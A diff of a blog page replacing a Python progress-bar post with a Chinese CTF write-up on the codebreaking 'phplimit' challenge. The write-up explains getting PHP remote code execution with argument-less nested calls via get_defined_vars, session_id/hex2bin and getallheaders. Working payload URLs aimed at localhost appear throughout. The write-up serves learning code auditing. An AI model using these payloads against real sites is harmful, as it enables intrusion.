@@ -75,7 +75,7 @@
 
 
 
-  <meta name="keywords" content="代码收集,">
+  <meta name="keywords" content="代码审计,">
 
 
 
@@ -86,24 +86,38 @@
 
 
 
-<meta name="description" content="最近在写python的项目，为了美观想加一个进度条，正好这里收集一下找到的众多可用例子 因为只是装饰作用，就没收集带第三方库的代码 一12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#!/usr/bin/env pytho">
-<meta name="keywords" content="代码收集">
+<meta name="description" content="最近在学习和总结代码审计的一些奇淫技巧，正好看到codebreaking上的题目，去年做的时候还是没什么头绪，所以准备完整学习总结下,预计会多写几篇这样的技巧记录，多学习一些tricks顺便还能开阔眼界。 示例背景以codebreaking的phplimit题目为例，我们以实现RCE为目的来进行分析 题目代码 &amp;lt;?php if(&amp;apos;;&amp;apos; === preg_replace(&amp;">
+<meta name="keywords" content="代码审计">
 <meta property="og:type" content="article">
-<meta property="og:title" content="python实现进度条">
-<meta property="og:url" content="https://yml-sec.top/2019/02/16/python实现进度条/index.html">
+<meta property="og:title" content="PHP无参数实现RCE">
+<meta property="og:url" content="https://yml-sec.top/2019/05/24/PHP无参数实现RCE/index.html">
 <meta property="og:site_name" content="yemoli&#39;s blog">
-<meta property="og:description" content="最近在写python的项目，为了美观想加一个进度条，正好这里收集一下找到的众多可用例子 因为只是装饰作用，就没收集带第三方库的代码 一12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#!/usr/bin/env pytho">
+<meta property="og:description" content="最近在学习和总结代码审计的一些奇淫技巧，正好看到codebreaking上的题目，去年做的时候还是没什么头绪，所以准备完整学习总结下,预计会多写几篇这样的技巧记录，多学习一些tricks顺便还能开阔眼界。 示例背景以codebreaking的phplimit题目为例，我们以实现RCE为目的来进行分析 题目代码 &amp;lt;?php if(&amp;apos;;&amp;apos; === preg_replace(&amp;">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="https://i.loli.net/2019/03/18/5c8f70366fe30.gif">
-<meta property="og:image" content="https://i.loli.net/2019/03/18/5c8f705db010a.gif">
-<meta property="og:image" content="https://i.loli.net/2019/03/18/5c8f709fa7530.gif">
-<meta property="og:image" content="https://i.loli.net/2019/03/18/5c8f70c8ce613.gif">
-<meta property="og:image" content="https://i.loli.net/2019/03/18/5c8f70df3c342.gif">
-<meta property="og:updated_time" content="2019-03-18T10:20:34.512Z">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/13385151-f834531b62ea2927.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/13385151-57121e63315ee829.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/13385151-893bbb955f44a26a.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/13385151-47f9139ed80722f8.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/13385151-915b380d7774c4d3.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/13385151-4cf59868f32f29a7.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/13385151-e4de269cf910cb9e.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/13385151-c81a4de3916e513f.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/13385151-6e664ee6d2ac5169.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/13385151-909f0566162f24d7.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/13385151-ed442311a16d53ad.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/13385151-1d3f65faa1f4e291.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/13385151-4a2ef551aa52a5e5.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/13385151-d91f2b2131292966.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/13385151-b43a8accde32d946.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/13385151-c63322a2bda1b0e2.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/13385151-91e92135c3e0c088.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/13385151-f47f34f825db61a8.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/13385151-d2426cdaefddd78c.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2019-05-24T11:10:19.913Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="python实现进度条">
-<meta name="twitter:description" content="最近在写python的项目，为了美观想加一个进度条，正好这里收集一下找到的众多可用例子 因为只是装饰作用，就没收集带第三方库的代码 一12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#!/usr/bin/env pytho">
-<meta name="twitter:image" content="https://i.loli.net/2019/03/18/5c8f70366fe30.gif">
+<meta name="twitter:title" content="PHP无参数实现RCE">
+<meta name="twitter:description" content="最近在学习和总结代码审计的一些奇淫技巧，正好看到codebreaking上的题目，去年做的时候还是没什么头绪，所以准备完整学习总结下,预计会多写几篇这样的技巧记录，多学习一些tricks顺便还能开阔眼界。 示例背景以codebreaking的phplimit题目为例，我们以实现RCE为目的来进行分析 题目代码 &amp;lt;?php if(&amp;apos;;&amp;apos; === preg_replace(&amp;">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/13385151-f834531b62ea2927.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 
 
 
@@ -133,13 +147,13 @@
 
 
 
-  <link rel="canonical" href="https://yml-sec.top/2019/02/16/python实现进度条/">
+  <link rel="canonical" href="https://yml-sec.top/2019/05/24/PHP无参数实现RCE/">
 
 
 
 
 
-  <title>python实现进度条 | yemoli's blog</title>
+  <title>PHP无参数实现RCE | yemoli's blog</title>
   
 
 
@@ -275,7 +289,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://yml-sec.top/2019/02/16/python实现进度条/">
+    <link itemprop="mainEntityOfPage" href="https://yml-sec.top/2019/05/24/PHP无参数实现RCE/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="夜莫离、">
@@ -292,7 +306,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">python实现进度条</h1>
+          <h1 class="post-title" itemprop="name headline">PHP无参数实现RCE</h1>
         
 
         <div class="post-meta">
@@ -304,8 +318,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-02-16T21:50:50+08:00">
-                2019-02-16
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-05-24T19:09:43+08:00">
+                2019-05-24
               </time>
             
 
@@ -336,7 +350,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  421
+                  1.2k
                 </span>
               
 
@@ -352,7 +366,7 @@
                   <span class="post-meta-item-text">Reading time &asymp;</span>
                 
                 <span title="Reading time">
-                  2
+                  5
                 </span>
               
             </div>
@@ -373,23 +387,99 @@
       
 
       
-        <p>最近在写python的项目，为了美观想加一个进度条，正好这里收集一下找到的众多可用例子</p>
-<p>因为只是装饰作用，就没收集带第三方库的代码</p>
-<h2 id="一"><a href="#一" class="headerlink" title="一"></a>一</h2><pre><code><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, number=<span class="number">50</span>, decimal=<span class="number">2</span>)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :param decimal: 你保留的保留小数位</span></span><br><span class="line"><span class="string">        :param number: # 号的 个数</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        self.decimal = decimal</span><br><span class="line">        self.number = number</span><br><span class="line">        self.a = <span class="number">100</span> / number  <span class="comment"># 在百分比 为几时增加一个 # 号</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self, now, total)</span>:</span></span><br><span class="line">        <span class="comment"># 1. 获取当前的百分比数</span></span><br><span class="line">        percentage = self.percentage_number(now, total)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 2. 根据 现在百分比计算</span></span><br><span class="line">        well_num = int(percentage / self.a)</span><br><span class="line">        <span class="comment"># print("well_num: ", well_num, percentage)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 3. 打印字符进度条</span></span><br><span class="line">        progress_bar_num = self.progress_bar(well_num)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 4. 完成的进度条</span></span><br><span class="line">        result = <span class="string">"\r%s %s"</span> % (progress_bar_num, percentage)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">percentage_number</span><span class="params">(self, now, total)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        计算百分比</span></span><br><span class="line"><span class="string">        :param now:  现在的数</span></span><br><span class="line"><span class="string">        :param total:  总数</span></span><br><span class="line"><span class="string">        :return: 百分</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">return</span> round(now / total * <span class="number">100</span>, self.decimal)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">progress_bar</span><span class="params">(self, num)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        显示进度条位置</span></span><br><span class="line"><span class="string">        :param num:  拼接的  “#” 号的</span></span><br><span class="line"><span class="string">        :return: 返回的结果当前的进度条</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment"># 1. "#" 号个数</span></span><br><span class="line">        well_num = <span class="string">"#"</span> * num</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 2. 空格的个数</span></span><br><span class="line">        space_num = <span class="string">" "</span> * (self.number - num)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'[%s%s]'</span> % (well_num, space_num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">index = Index()</span><br><span class="line"></span><br><span class="line">start = <span class="number">371</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(start + <span class="number">1</span>):</span><br><span class="line">    print(index(i, start), end=<span class="string">''</span>)</span><br><span class="line">    time.sleep(<span class="number">0.01</span>)</span><br><span class="line">    <span class="comment"># \r 返回本行开头</span></span><br><span class="line">    <span class="comment"># end : python 结尾不加任何操作, 默认是空格</span></span><br></pre></td></tr></table></figure>
-</code></pre><p>效果图：</p>
-<p><img src="https://i.loli.net/2019/03/18/5c8f70366fe30.gif" alt=""></p>
-<h2 id="二"><a href="#二" class="headerlink" title="二"></a>二</h2><pre><code><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">    time.sleep(<span class="number">0.3</span>)</span><br><span class="line">    print(str(i)*<span class="number">10</span>)</span><br></pre></td></tr></table></figure>
-</code></pre><p>效果图</p>
-<p><img src="https://i.loli.net/2019/03/18/5c8f705db010a.gif" alt=""></p>
-<h2 id="三"><a href="#三" class="headerlink" title="三"></a>三</h2><pre><code><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    time.sleep(<span class="number">0.3</span>)</span><br><span class="line">    print(<span class="string">'\r'</span>, end=<span class="string">''</span>)</span><br><span class="line">    print(str(i)*<span class="number">10</span>, end=<span class="string">''</span>)</span><br><span class="line">    sys.stdout.flush()</span><br></pre></td></tr></table></figure>
-</code></pre><p>效果图</p>
-<p><img src="https://i.loli.net/2019/03/18/5c8f709fa7530.gif" alt=""></p>
-<h2 id="四"><a href="#四" class="headerlink" title="四"></a>四</h2><pre><code><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">n = <span class="number">10</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">    time.sleep(<span class="number">0.3</span>)</span><br><span class="line">    sys.stdout.write(<span class="string">'\r'</span>)</span><br><span class="line">    sys.stdout.write(str(i)*(n-i))</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">sys.stdout.write(<span class="string">'n'</span>)</span><br></pre></td></tr></table></figure>
-</code></pre><p>效果图</p>
-<p><img src="https://i.loli.net/2019/03/18/5c8f70c8ce613.gif" alt=""></p>
-<h2 id="五"><a href="#五" class="headerlink" title="五"></a>五</h2><pre><code><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">progress_test</span><span class="params">()</span>:</span></span><br><span class="line">  bar_length=<span class="number">20</span></span><br><span class="line">  <span class="keyword">for</span> percent <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">101</span>):</span><br><span class="line">    hashes = <span class="string">'#'</span> * int(percent/<span class="number">100.0</span> * bar_length)</span><br><span class="line">    spaces = <span class="string">' '</span> * (bar_length - len(hashes))</span><br><span class="line">    sys.stdout.write(<span class="string">"\rPercent: [%s] %d%%"</span>%(hashes + spaces, percent))</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">progress_test()</span><br></pre></td></tr></table></figure>
-</code></pre><p>效果图</p>
-<p><img src="https://i.loli.net/2019/03/18/5c8f70df3c342.gif" alt=""></p>
+        <p>最近在学习和总结代码审计的一些奇淫技巧，正好看到codebreaking上的题目，去年做的时候还是没什么头绪，所以准备完整学习总结下,预计会多写几篇这样的技巧记录，多学习一些tricks顺便还能开阔眼界。</p>
+<h1 id="示例背景"><a href="#示例背景" class="headerlink" title="示例背景"></a>示例背景</h1><p>以codebreaking的phplimit题目为例，我们以实现RCE为目的来进行分析</p>
+<p>题目代码</p>
+<pre><code>&lt;?php
+if(&apos;;&apos; === preg_replace(&apos;/[^\W]+\((?R)?\)/&apos;, &apos;&apos;, $_GET[&apos;code&apos;])) {    
+    eval($_GET[&apos;code&apos;]);
+} else {
+    show_source(__FILE__);
+}
+</code></pre><p>首先我们简单分析下正则部分</p>
+<p>[^\W]的意思是包括所有数字字母和下划线，而((?R)?)表示重复进行整个模式</p>
+<p>这意味着我们需要输入可以循环嵌套的字符串，也就意味着如果我们输入一个有参数的函数，将不会成功的匹配正则</p>
+<p>所以输入点我们虽然可以输入函数，但是不能输入有参数的函数</p>
+<p>下面讨论下bypass的方法</p>
+<h1 id="nginx下的利用"><a href="#nginx下的利用" class="headerlink" title="nginx下的利用"></a>nginx下的利用</h1><h2 id="基于get-defined-vars-函数的利用"><a href="#基于get-defined-vars-函数的利用" class="headerlink" title="基于get_defined_vars()函数的利用"></a>基于get_defined_vars()函数的利用</h2><p>我们看一下该函数的官方文档</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/13385151-f834531b62ea2927.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.jpg"></p>
+<p>我们可以通过定义新的变量来控制该函数的返回值</p>
+<p>例如下面这样</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/13385151-57121e63315ee829.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.jpg"></p>
+<pre><code>array(4) { [&quot;_GET&quot;]=&gt; array(2) { [&quot;yml&quot;]=&gt; string(4) &quot;cool&quot; [&quot;code&quot;]=&gt; string(29) &quot;var_dump(get_defined_vars());&quot; } [&quot;_POST&quot;]=&gt; array(0) { } [&quot;_COOKIE&quot;]=&gt; array(0) { } [&quot;_FILES&quot;]=&gt; array(0) { } } 
+</code></pre><p>我们可以使cool变成我们想要执行的代码，例如phpinfo();</p>
+<pre><code>http://127.0.0.1/demo5.php?yml=phpinfo();&amp;code=var_dump(get_defined_vars());
+</code></pre><p><img src="https://upload-images.jianshu.io/upload_images/13385151-893bbb955f44a26a.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.jpg"></p>
+<p>然后我们现在要想办法将我们想执行的代码从数组中提取出来</p>
+<p>用到下面几个函数</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/13385151-47f9139ed80722f8.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.jpg"></p>
+<p>先用current函数取出get键值所对应的值</p>
+<pre><code>http://127.0.0.1/demo5.php?yml=phpinfo();&amp;code=var_dump(current(get_defined_vars()));
+</code></pre><p><img src="https://upload-images.jianshu.io/upload_images/13385151-915b380d7774c4d3.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.jpg"></p>
+<p>然后再利用array_values函数</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/13385151-4cf59868f32f29a7.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.jpg"></p>
+<p>将数组的值重新组成一个数组</p>
+<pre><code>http://127.0.0.1/demo5.php?yml=phpinfo();&amp;code=var_dump(array_values(current(get_defined_vars())));
+</code></pre><p><img src="https://upload-images.jianshu.io/upload_images/13385151-e4de269cf910cb9e.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.jpg"></p>
+<p>再次利用current函数取出数组第一个值</p>
+<pre><code>http://127.0.0.1/demo5.php?yml=phpinfo();&amp;code=var_dump(current(array_values(current(get_defined_vars()))));
+</code></pre><p><img src="https://upload-images.jianshu.io/upload_images/13385151-c81a4de3916e513f.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.jpg"></p>
+<p>将var_dump改成eval即可实现RCE</p>
+<pre><code>http://127.0.0.1/demo5.php?yml=phpinfo();&amp;code=eval(current(array_values(current(get_defined_vars()))));
+</code></pre><p><img src="https://upload-images.jianshu.io/upload_images/13385151-6e664ee6d2ac5169.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.jpg">        </p>
+<h2 id="控制header头某些参数"><a href="#控制header头某些参数" class="headerlink" title="控制header头某些参数"></a>控制header头某些参数</h2><p>我们可以控制header的某些参数来实现恶意代码的传输，这时我们需要利用code参数来传入一个获取header属性值的函数</p>
+<p>head头中最常见的属性就是cookie了，我们可以利用session_id()这个函数</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/13385151-909f0566162f24d7.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="19.jpg"></p>
+<p>我们可以控制sessionid的值，然后用session_id()来获取sessionid</p>
+<p>由于sessionid格式的限制，我们可以将想控制的参数转为16进制，然后在code处使用hex2bin函数将16进制数转字符串函数即可</p>
+<p>我们实际测试一下</p>
+<p>首先将phpinfo();转成16进制数</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/13385151-ed442311a16d53ad.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="10.jpg"></p>
+<p>然后请求URL</p>
+<pre><code>http://127.0.0.1/demo5.php?code=eval(hex2bin(session_id()));
+</code></pre><p>抓包修改cookie为phpinfo()的16进制</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/13385151-1d3f65faa1f4e291.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="11.jpg"></p>
+<p>发现并没有执行phpinfo()</p>
+<p>仔细分析我们的利用方式，通过对session机制的深入了解，在w3school发现了这个</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/13385151-4a2ef551aa52a5e5.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="12.jpg"></p>
+<p>此时更改我们请求的URL为</p>
+<pre><code>http://127.0.0.1/demo5.php?code=eval(hex2bin(session_id(session_start())));
+</code></pre><p>再次进行上述操作，成功实现RCE</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/13385151-d91f2b2131292966.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="13.jpg"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/13385151-b43a8accde32d946.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="14.jpg"></p>
+<h1 id="apache下的利用"><a href="#apache下的利用" class="headerlink" title="apache下的利用"></a>apache下的利用</h1><p>当web服务器为apache时，nginx下的函数虽不能用，但是我们可以使用同样的思路，通过控制head头参数来实现RCE</p>
+<p>我们可以使用getallheaders函数，来看一下官方文档</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/13385151-c63322a2bda1b0e2.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="15.jpg"></p>
+<p>实际测试一下</p>
+<pre><code>http://127.0.0.1/demo5.php?code=var_dump(getallheaders());
+</code></pre><p>返回信息</p>
+<pre><code>array(8) {
+  [&quot;Host&quot;]=&gt;
+  string(9) &quot;127.0.0.1&quot;
+  [&quot;User-Agent&quot;]=&gt;
+  string(73) &quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0&quot;
+  [&quot;Accept&quot;]=&gt;
+  string(63) &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;
+  [&quot;Accept-Language&quot;]=&gt;
+  string(35) &quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;
+  [&quot;Accept-Encoding&quot;]=&gt;
+  string(13) &quot;gzip, deflate&quot;
+  [&quot;DNT&quot;]=&gt;
+  string(1) &quot;1&quot;
+  [&quot;X-Forwarded-For&quot;]=&gt;
+  string(9) &quot;127.0.0.1&quot;
+  [&quot;Connection&quot;]=&gt;
+  string(10) &quot;keep-alive&quot;
+}
+</code></pre><p>这样我们可以尝试控制host的值来传入我们的命令，如phpinfo();</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/13385151-91e92135c3e0c088.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="16.jpg"></p>
+<p>为了将phpinfo();取出来，我们可以使用current函数</p>
+<pre><code>http://127.0.0.1/demo5.php?code=var_dump(current(getallheaders()));
+</code></pre><p><img src="https://upload-images.jianshu.io/upload_images/13385151-f47f34f825db61a8.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="17.jpg"></p>
+<p>将var_dump()改为eval()即实现RCE</p>
+<pre><code>http://127.0.0.1/demo5.php?code=eval(current(getallheaders()));
+</code></pre><p><img src="https://upload-images.jianshu.io/upload_images/13385151-d2426cdaefddd78c.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="18.jpg"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>虽然刚入手这一部分的知识感觉理解上很吃力，但是经过自己反复实际操作后，也弄清楚了很多细节，理清背景思路后回头思考会发现并没有那么困难，这也引发了我的一些思考，我们在平时学习某一块的知识时，不应该光看不做，只有实际操作后才会弄清很多细节，深刻理解这些技巧的精髓。</p>
 
       
     </div>
@@ -436,7 +526,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/代码收集/" rel="tag"># 代码收集</a>
+            <a href="/tags/代码审计/" rel="tag"># 代码审计</a>
           
         </div>
       
@@ -449,8 +539,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/02/15/curl说明书/" rel="next" title="curl说明书">
-                <i class="fa fa-chevron-left"></i> curl说明书
+              <a href="/2019/05/14/code-breaking-function/" rel="next" title="code-breaking-function">
+                <i class="fa fa-chevron-left"></i> code-breaking-function
               </a>
             
           </div>
@@ -458,10 +548,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/02/19/针对Metasploitable2靶机的测试/" rel="prev" title="针对Metasploitable2靶机的测试">
-                针对Metasploitable2靶机的测试 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -656,7 +742,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#一"><span class="nav-number">1.</span> <span class="nav-text">一</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二"><span class="nav-number">2.</span> <span class="nav-text">二</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三"><span class="nav-number">3.</span> <span class="nav-text">三</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#四"><span class="nav-number">4.</span> <span class="nav-text">四</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#五"><span class="nav-number">5.</span> <span class="nav-text">五</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#示例背景"><span class="nav-number">1.</span> <span class="nav-text">示例背景</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#nginx下的利用"><span class="nav-number">2.</span> <span class="nav-text">nginx下的利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#基于get-defined-vars-函数的利用"><span class="nav-number">2.1.</span> <span class="nav-text">基于get_defined_vars()函数的利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#控制header头某些参数"><span class="nav-number">2.2.</span> <span class="nav-text">控制header头某些参数</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#apache下的利用"><span class="nav-number">3.</span> <span class="nav-text">apache下的利用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number">4.</span> <span class="nav-text">总结</span></a></li></ol></div>
             
 
           </div>
